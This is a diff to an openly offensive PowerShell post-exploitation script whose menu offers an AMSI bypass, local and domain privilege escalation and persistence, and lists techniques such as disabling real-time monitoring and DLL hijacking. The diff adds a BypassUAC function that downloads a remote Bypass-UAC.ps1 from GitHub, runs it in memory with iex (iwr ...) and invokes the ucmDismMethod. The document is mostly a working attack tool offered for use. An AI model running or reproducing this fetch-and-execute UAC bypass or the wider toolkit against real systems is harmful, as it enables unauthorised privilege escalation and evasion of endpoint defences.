@@ -21,7 +21,7 @@ $confirmation = Read-Host "Would you like to run an AMSI Bypass? (Y/N):"
 $confirmation = Read-Host "Domain Priv Esc or Local Priv Esc (DomainPrivEsc/LocalPrivEsc/Persistence)?:"
       	if ($confirmation -eq 'LocalPrivEsc')
       	{
-			write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] This script can run the following commands DisableRealTimeMonitoring, SeImpersonatePrivilege, AlwaysInstallElevated, DLLHijack, BackUpOperator, ServerOperator, DNSAdmin, PowerShellScheduledTask, UnquotedServicePath, PortForward. Thanks for using it, built by OverGrownCarrot1"
+			write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] This script can run the following commands DisableRealTimeMonitoring, SeImpersonatePrivilege, BypassUAC, AlwaysInstallElevated, DLLHijack, BackUpOperator, ServerOperator, DNSAdmin, PowerShellScheduledTask, UnquotedServicePath, PortForward. Thanks for using it, built by OverGrownCarrot1"
 			start-sleep -seconds 5
 			write-host -foregroundcolor yellow -backgroundcolor black "`n`n[*] Running whoami"
 			whoami
@@ -789,5 +789,11 @@ Function Delegation
 	$delegation = Read-Host -Prompt "Which machine does user have unconstrained delegation to"
 	$sess = new-pssession -computername $delegation
 	$sess = enter-pssession -session $sess
+}
 
+Function BypassUAC
+{
+	write-host -foregroundcolor yellow -backgroundcolor black "Putting BypassUAC.ps1 into memory"
+	iex (iwr https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/master/Bypass-UAC/Bypass-UAC.ps1)
+	Bypass-UAC -Method ucmDismMethod
 }	
